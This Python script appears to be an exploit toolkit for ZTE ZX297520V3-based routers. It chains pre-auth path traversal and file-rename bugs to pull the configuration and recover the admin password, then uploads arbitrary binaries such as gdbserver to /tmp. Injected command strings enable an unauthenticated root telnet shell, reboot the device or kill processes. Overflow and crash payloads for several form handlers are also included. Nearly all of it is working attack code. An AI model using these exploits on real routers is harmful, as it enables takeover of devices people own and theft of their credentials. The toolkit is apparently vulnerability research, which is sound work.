import requests
import json
import time
import base64
import random
from datetime import datetime
import os
from goform import *
import re
from util import *
import sys
import argparse

def current_milli_time():
    return round(time.time() * 1000)

def print_nice_response(response_body):
    # Parse the JSON response body
    response_json = json.loads(response_body)

    # Print the nicely formatted output
    result = response_json.get("result", {})
    file_info_list = result.get("fileInfo", [])
    total_record = result.get("totalRecord", "")

    info(f"Total Records: {total_record}")
    info("File Info:")
    for file_info in file_info_list:
        file_name = file_info.get("fileName", "N/A")
        attribute = file_info.get("attribute", "N/A")
        size = file_info.get("size", "N/A")
        last_update_time = file_info.get("lastUpdateTime", "N/A")
        print(f"      File Name: {file_name}")
        print(f"        Attribute: {attribute}")
        print(f"        Size: {size}")
        print(f"        Last Update Time: {last_update_time}")
    print()


def upload_file(filename, ip):
    url = f"http://{ip}/cgi-bin/zte_httpshare/{filename.split('/')[-1]}"
    headers = {
        "Host": ip,
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": f"http://{ip}",
        # "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarysCCYq4AgDGD9h5Us",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Sec-GPC": "1",
        "Accept-Language": "en-US,en",
        "Referer": f"http://{ip}/index.html",
        "Accept-Encoding": "gzip, deflate"
    }

    # Get the current date and time
    current_time = datetime.now()
    formatted_time = current_time.strftime('%Y-%m-%d %H:%M:%S')
    unix_time = int(current_time.timestamp())

    # Prepare the files dictionary with the correct date and time
    files = {
        'path_SD_CARD_time': (None, formatted_time),
        'path_SD_CARD_time_unix': (None, str(unix_time)),
        'filename': (filename.split('/')[-1], open(filename, 'rb'), 'image/png')
    }

    response = requests.post(url, headers=headers, files=files)
    info(f"Status Code: {response.status_code}")
    info(f"Response Body: {response.text}")



def download_file(url, filename, ip):
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en",
        "Referer": f"http://{ip}/index.html",
    }

    try:
        info(f"Sending GET HTTP request to {url}")

        # Send GET request to fetch the file
        response = requests.get(url, headers=headers)

        # Check if request was successful
        if response.status_code == 200:
            # Save the file to disk
            with open(filename, 'wb') as f:
                f.write(response.content)
            good(f"Download complete, file saved to {filename}")
            return response.content
        else:
            bad(f"Failed to download file. Status code: {response.status_code}")
            return ''

    except requests.exceptions.RequestException as e:
        bad(f"Error fetching file: {e}")
        return ''


def arbitrary_cfg_clear(cfg_value, ip):
    url = f"http://{ip}/goform/goform_get_cmd_process"
    params = {
        "multi_data": "1",
        "cmd": cfg_value,
        f"{cfg_value}_flag": "0"
    }
    headers = {
        "Host": ip,
        "Connection": "keep-alive",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-GPC": "1",
        "Accept-Language": "en-US,en",
        "Referer": f"http://{ip}/index.html",
        "Accept-Encoding": "gzip, deflate"
    }

    response = requests.get(url, headers=headers, params=params)
    info(f"Status Code: {response.status_code}")
    info(f"Response Body: {response.text}")


def arbitrary_cfg_clear_2(cfg_value, ip):
    url = f"http://{ip}/goform/goform_get_cmd_process"
    params = {
        "cmd": cfg_value,
        "flag": "0"
    }
    headers = {
        "Host": ip,
        "Connection": "keep-alive",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-GPC": "1",
        "Accept-Language": "en-US,en",
        "Referer": f"http://{ip}/index.html",
        "Accept-Encoding": "gzip, deflate"
    }

    response = requests.get(url, headers=headers, params=params)
    info(f"Status Code: {response.status_code}")
    info(f"Response Body: {response.text}")


def extract_admin_password(input_bytes):
    # Define the regex pattern to find "admin_Password=" followed by any characters until a null character
    pattern = rb'admin_Password=(.*?)\x00'
    
    # Search for the pattern in the input bytes
    match = re.search(pattern, input_bytes)
    
    # If a match is found, return the data part decoded to a string
    if match:
        return match.group(1).decode('utf-8')
    else:
        return None


def get_admin_password(ip):
    goform_set(GOFORM_HTTPSHARE_FILE_RENAME("/mmc2/./../../../etc_rw/wifi", "/mmc2/./../../../etc_rw/wifi_backup"), ip)
    time.sleep(0.25)
    goform_set(GOFORM_HTTPSHARE_FILE_RENAME("/mmc2/./../../../etc_rw/nv/backup", "/mmc2/./../../../etc_rw/nv/qrcode_ssid_wifikey.png"), ip)
    time.sleep(0.25)
    goform_set(GOFORM_HTTPSHARE_FILE_RENAME("/mmc2/./../../../etc_rw/nv", "/mmc2/./../../../etc_rw/wifi"), ip)
    time.sleep(0.25)
    
    recovered_config = download_file(f"http://{ip}/img/qrcode_ssid_wifikey.png/cfg", "pulled_cfg", ip)
    admin_pwd = extract_admin_password(recovered_config)
    good(f"Recovered admin password: {admin_pwd}\n")
    
    time.sleep(0.25)
    goform_set(GOFORM_HTTPSHARE_FILE_RENAME("/mmc2/./../../../etc_rw/wifi", "/mmc2/./../../../etc_rw/nv"), ip)
    time.sleep(0.25)
    goform_set(GOFORM_HTTPSHARE_FILE_RENAME("/mmc2/./../../../etc_rw/nv/qrcode_ssid_wifikey.png", "/mmc2/./../../../etc_rw/nv/backup"), ip)
    time.sleep(0.25)
    goform_set(GOFORM_HTTPSHARE_FILE_RENAME("/mmc2/./../../../etc_rw/wifi_backup", "/mmc2/./../../../etc_rw/wifi"), ip)

    return admin_pwd


def enable_telnet(admin_pwd, ip):
    info("Logging in...\n")
    goform_set(GOFORM_LOGIN(admin_pwd), ip)
    info("Enabling telnet...")
    goform_set(GOFORM_REMOVE_WHITE_SITE("test\" ; telnetd -l /bin/ash #"), ip)


def upload_gdb(ip):
    info("Entering /tmp directory...")
    print_nice_response(goform_set(GOFORM_HTTPSHARE_ENTERFOLD("/mmc2/../../../../../../tmp", "1"), ip))
    info("Uploading gdbserver...")
    upload_file('binaries/gdbserver-static', ip)


def upload_generic_file(filename, ip):
    info("Entering /tmp directory...")
    print_nice_response(goform_set(GOFORM_HTTPSHARE_ENTERFOLD("/mmc2/../../../../../../tmp", "1"), ip))
    info(f"Uploading {filename.split('/')[-1]}...")
    upload_file(filename, ip)


def overwrite_qr_code(ip):
    # pre auth arbitrary file write, overwrites QR code with silly face
    print_nice_response(goform_set(GOFORM_HTTPSHARE_ENTERFOLD("/mmc2/../../../../../../etc_rw/wifi", "1"), ip))
    upload_file('images/ssid_wifikey.bmp', ip)


def goform_get(cmd, ip):
    url = f"http://{ip}/goform/goform_get_cmd_process"
    headers = {
        "Host": ip,
        "Connection": "keep-alive",
        "Content-Length": "47",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Sec-GPC": "1",
        "Accept-Language": "en-US,en",
        "Origin": f"http://{ip}",
        "Referer": f"http://{ip}/index.html",
        "Accept-Encoding": "gzip, deflate"
    }

    data = f"cmd={cmd}"

    response = requests.post(url, headers=headers, data=data)
    info(f"Status Code: {response.status_code}")
    info(f"Response Body: {response.text}")
    

def print_help():
    entries = [
        ["-h", "Display help"],
        ["-enable_telnet", "\033[34m[UTIL]\033[0m Uses a command injection to enable telnet"],
        ["-enterfold", "\033[34m[UTIL]\033[0m Uses directory traversal to ls directories"],
        ["-upload_gdb", "\033[34m[UTIL]\033[0m Uses file write to upload gdbserver to /tmp"],
        ["-goform_get [cmd]", "\033[34m[UTIL]\033[0m Do goform GET request with specified command"],
        ["-arb_config_clear [name]", "\033[34m[PoC]\033[0m Pre-auth command injection PoC for goform "],
        ["-PINT_DIAGNOSTICS_START_inj", "\033[34m[PoC]\033[0m Post-auth command injection for PINT_DIAGNOSTICS_START"],
        ["-ADD_WHITE_SITE_inj", "\033[34m[PoC]\033[0m Post-auth command injection for ADD_WHITE_SITE"],
        ["-REMOVE_WHITE_SITE_inj", "\033[34m[PoC]\033[0m Post-auth command injection for REMOVE_WHITE_SITE"],
        ["-REMOVE_WHITE_SITE_overflow", "\033[34m[PoC]\033[0m Post-auth stack overflow for REMOVE_WHITE_SITE (in zte_mainctrl)"],
        ["-DEL_DEVICE_inj", "\033[34m[PoC]\033[0m Post-auth command injection for DEL_DEVICE"],
        ["-ADD_DEVICE_inj", "\033[34m[PoC]\033[0m Post-auth command injection for ADD_DEVICE"],
        ["-BIND_STATIC_ADDRESS_DEL_inj", "\033[34m[PoC]\033[0m Post-auth command injection for BIND_STATIC_ADDRESS_DEL"],
        ["-BIND_STATIC_ADDRESS_ADD_inj", "\033[34m[PoC]\033[0m Post-auth command injection for BIND_STATIC_ADDRESS_ADD"],
        ["-EDIT_HOSTNAME_inj", "\033[34m[PoC]\033[0m Post-auth command injection for EDIT_HOSTNAME"],
        ["-DMZ_SETTING_inj", "\033[34m[PoC]\033[0m Post-auth command injection for DMZ_SETTING"],
        ["-STATIC_DHCP_SETTING_inj", "\033[34m[PoC]\033[0m Post-auth command injection for STATIC_DHCP_SETTING"],
        ["-URL_FILTER_ADD_inj", "\033[34m[PoC]\033[0m Post-auth command injection for URL_FILTER_ADD"],
        ["-CHANGE_MAC_overflow", "\033[34m[PoC]\033[0m Post-auth stack overflow in CHANGE_MAC"],
        ["-GOFORM_DELETE_SMS_crash", "\033[34m[PoC]\033[0m Post-auth crash in GOFORM_DELETE_SMS"],
        ["-GOFORM_MOVE_TO_SIM_crash", "\033[34m[PoC]\033[0m Post-auth crash in GOFORM_MOVE_TO_SIM"],
        ["-get_admin_pwd", "\033[34m[EXPLOIT]\033[0m Uses pre-auth file rename to extract config, then admin password"],
        ["-overwrite_qr_code", "\033[34m[EXPLOIT]\033[0m Uses pre-auth file write to overwrite QR code displayed"],
        ["-flappy", "\033[34m[EXPLOIT]\033[0m Chain auth bypass, file write, and command injection to play flappy bird"],
    ]

    info("Help:")
    
    for entry in entries:
        cmd_length = len(entry[0])
        print(f"\033[95m    {entry[0]}\033[0m{' ' * (40-cmd_length)}{entry[1]}")


def main():
    print_ascii_art()

    # define main parser
    parser = argparse.ArgumentParser(prog='python3 ZX297520V3_hax.py')

    subparsers = parser.add_subparsers(dest='command', help='Available functions')

    parser.add_argument("-router_ip",
                    type=str,
                    required=False,
                    help="IP of the router",
                    default="192.168.1.1")

    parser.add_argument("-admin_pwd",
                    type=str,
                    required=False,
                    help="Admin password of the router",
                    default="admin")

    # define parser for enable_telnet command
    enable_telnet_parser = subparsers.add_parser('enable_telnet', 
                    help='Enable telnet on the router')

    # define parser for upload_gdb command
    upload_gdb_parser = subparsers.add_parser('upload_gdb', 
                    help='Uploads gdb to /tmp')

    # define parser for get_admin_pwd command
    get_admin_pwd_parser = subparsers.add_parser('get_admin_pwd', 
                    help='Uses pre-auth file rename to get the admin password')

    # define parser for overwrite_qr_code command
    overwrite_qr_code_parser = subparsers.add_parser('overwrite_qr_code', 
                    help='Uses pre-auth file write to overwrite the wifi creds qr code')

    # define parser for flappy command
    flappy_parser = subparsers.add_parser('flappy', 
                    help='Uses pre-auth and post-auth bugs to auth bypass, upload and run flappy bird')

    # define parser for enterfold command
    enterfold_parser = subparsers.add_parser('enterfold', 
                    help='Lists the contents of directory using directory traversal bug')
    enterfold_parser.add_argument("path",
                    type=str,
                    help="path of the directory you wish to list")

    # define parser for upload_file command
    upload_file_parser = subparsers.add_parser('upload_file', 
                    help='Lists the contents of directory using directory traversal bug')
    upload_file_parser.add_argument("path",
                    type=str,
                    help="path of the file you wish to upload to /tmp")

    # define parser for arb_cfg_clear_v1 command
    arb_cfg_clear_v1_parser = subparsers.add_parser('arb_cfg_clear_v1', 
                    help='Clear config value specified by key using bug')
    arb_cfg_clear_v1_parser.add_argument("key",
                    type=str,
                    help="key of the config value you wish to clear")

    # define parser for arb_cfg_clear_v2 command
    arb_cfg_clear_v2_parser = subparsers.add_parser('arb_cfg_clear_v2', 
                    help='Clear config value specified by key using bug')
    arb_cfg_clear_v2_parser.add_argument("key",
                    type=str,
                    help="key of the config value you wish to clear")

    # define parser for goform_get command
    goform_get_parser = subparsers.add_parser('goform_get', 
                    help='Use goform get endpoint to get config value')
    goform_get_parser.add_argument("key",
                    type=str,
                    help="key of the config value you want to get")

    # define parser for command injection PoCs
    pint_diagnostics_start_inj_parser = subparsers.add_parser('PINT_DIAGNOSTICS_START_inj', 
                    help='PoC for command injection in PINT_DIAGNOSTICS_START goform set command')
    add_white_site_inj_parser = subparsers.add_parser('ADD_WHITE_SITE_inj', 
                    help='PoC for command injection in ADD_WHITE_SITE goform set command')
    remove_white_site_inj_parser = subparsers.add_parser('REMOVE_WHITE_SITE_inj', 
                    help='PoC for command injection in REMOVE_WHITE_SITE goform set command')
    add_device_inj_parser = subparsers.add_parser('ADD_DEVICE_inj', 
                    help='PoC for command injection in ADD_DEVICE goform set command')
    del_device_inj_parser = subparsers.add_parser('DEL_DEVICE_inj', 
                    help='PoC for command injection in DEL_DEVICE goform set command')
    edit_hostname_inj_parser = subparsers.add_parser('EDIT_HOSTNAME_inj', 
                    help='PoC for command injection in EDIT_HOSTNAME goform set command')
    dmz_setting_inj_parser = subparsers.add_parser('DMZ_SETTING_inj', 
                    help='PoC for command injection in DMZ_SETTING goform set command')
    static_dhcp_setting_inj_parser = subparsers.add_parser('STATIC_DHCP_SETTING_inj', 
                    help='PoC for command injection in STATIC_DHCP_SETTING goform set command')
    url_filter_add_inj_parser = subparsers.add_parser('URL_FILTER_ADD_inj', 
                    help='PoC for command injection in URL_FILTER_ADD goform set command')
    bind_static_address_add_inj_parser = subparsers.add_parser('BIND_STATIC_ADDRESS_ADD_inj', 
                    help='PoC for command injection in BIND_STATIC_ADDRESS_ADD goform set command')
    bind_static_address_del_inj_parser = subparsers.add_parser('BIND_STATIC_ADDRESS_DEL_inj', 
                    help='PoC for command injection in BIND_STATIC_ADDRESS_DEL goform set command')

    # define parser for other PoCs
    remove_white_site_overflow_parser = subparsers.add_parser('REMOVE_WHITE_SITE_overflow', 
                    help='PoC for stack overflow in REMOVE_WHITE_SITE goform set command')
    change_mac_overflow_parser = subparsers.add_parser('CHANGE_MAC_overflow', 
                    help='PoC for stack overflow in CHANGE_MAC goform set command')
    goform_delete_sms_crash_parser = subparsers.add_parser('GOFORM_DELETE_SMS_crash', 
                    help='PoC for crash in GOFORM_DELETE_SMS goform set command')
    goform_move_to_sim_crash_parser = subparsers.add_parser('GOFORM_MOVE_TO_SIM_crash', 
                    help='PoC for crash in GOFORM_MOVE_TO_SIM goform set command')
    

    # run once arguments parsed
    arguments = parser.parse_args()

    if (arguments.command == 'enable_telnet'):
        enable_telnet(arguments.admin_pwd, arguments.router_ip)
    elif (arguments.command == 'enterfold'):
        print_nice_response(goform_set(GOFORM_HTTPSHARE_ENTERFOLD(f"/mmc2/../../../../../..{arguments.path}", "1"), arguments.router_ip))
    elif (arguments.command == 'upload_gdb'):
        upload_gdb(arguments.router_ip)
    elif (arguments.command == 'upload_file'):
        upload_generic_file(arguments.path, arguments.router_ip)
    elif (arguments.command == 'get_admin_pwd'):
        get_admin_password(arguments.router_ip)
    elif (arguments.command == 'overwrite_qr_code'):
        overwrite_qr_code(arguments.router_ip)
    elif (arguments.command == 'arb_cfg_clear_v1'):
        arbitrary_cfg_clear(arguments.key, arguments.router_ip)
    elif (arguments.command == 'arb_cfg_clear_v2'):
        arbitrary_cfg_clear_2(arguments.key, arguments.router_ip)
    elif (arguments.command == 'goform_get'):
        if (arguments.admin_pwd != ''):
            goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_get(arguments.key, arguments.router_ip)
    elif (arguments.command == 'flappy'):
        upload_generic_file("images/flappy_bg.rgb", arguments.router_ip)
        print()
        upload_generic_file("Payloads/Flappy/flappy", arguments.router_ip)
        print()
        admin_pwd = get_admin_password(arguments.router_ip)
        info(f"Logging in with admin password: {admin_pwd}")
        print()
        goform_set(GOFORM_LOGIN(admin_pwd), arguments.router_ip)
        goform_set(GOFORM_REMOVE_WHITE_SITE("test\" ; kill $(ps | grep zte_mmi | grep -v grep | awk '{print $1}') #"), arguments.router_ip)
        goform_set(GOFORM_REMOVE_WHITE_SITE("test\" ; chmod +x /tmp/flappy ; /tmp/flappy #"), arguments.router_ip)
    elif (arguments.command == 'PINT_DIAGNOSTICS_START_inj'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_PINT_DIAGNOSTICS_START("127.0.0.1", "1", "1", "1", "eth0 ; reboot ;"), arguments.router_ip)
    elif (arguments.command == 'ADD_WHITE_SITE_inj'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_ADD_WHITE_SITE("test\" ; reboot #", "test"), arguments.router_ip)
    elif (arguments.command == 'REMOVE_WHITE_SITE_inj'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_REMOVE_WHITE_SITE("test\" ; reboot #"), arguments.router_ip)
    elif (arguments.command == 'DEL_DEVICE_inj'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_DEL_DEVICE("\" ; reboot ######"), arguments.router_ip)
    elif (arguments.command == 'ADD_DEVICE_inj'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_ADD_DEVICE("\" ; reboot ######"), arguments.router_ip)
    elif (arguments.command == 'BIND_STATIC_ADDRESS_DEL_inj'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_BIND_STATIC_ADDRESS_DEL("; reboot ########"), arguments.router_ip)
    elif (arguments.command == 'BIND_STATIC_ADDRESS_ADD_inj'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_BIND_STATIC_ADDRESS_ADD("00:00:00:00:00:00", "; reboot #"), arguments.router_ip)
    elif (arguments.command == 'EDIT_HOSTNAME_inj'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_EDIT_HOSTNAME("00:00:00:00:00:00", "\"; reboot #"), arguments.router_ip)
    elif (arguments.command == 'DMZ_SETTING_inj'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_DMZ_SETTING("1", "127.0.0.1 ; reboot #"), arguments.router_ip)
    elif (arguments.command == 'STATIC_DHCP_SETTING_inj'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_STATIC_DHCP_SETTING("+ + | reboot # ;"), arguments.router_ip)
    elif (arguments.command == 'URL_FILTER_ADD_inj'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_URL_FILTER_ADD("| reboot # "), arguments.router_ip)
    elif (arguments.command == 'REMOVE_WHITE_SITE_overflow'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_REMOVE_WHITE_SITE("a"*500), arguments.router_ip)
    elif (arguments.command == 'CHANGE_MAC_overflow'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_CHANGE_MAC("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag:"), arguments.router_ip)
    elif (arguments.command == 'GOFORM_DELETE_SMS_crash'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_DELETE_SMS(";" * 103), arguments.router_ip)
    elif (arguments.command == 'GOFORM_MOVE_TO_SIM_crash'):
        goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
        goform_set(GOFORM_MOVE_TO_SIM(";" * 1200 ), arguments.router_ip) # 'aaa;' * 400 # crash at 1cf00

if __name__ == "__main__":
    main()
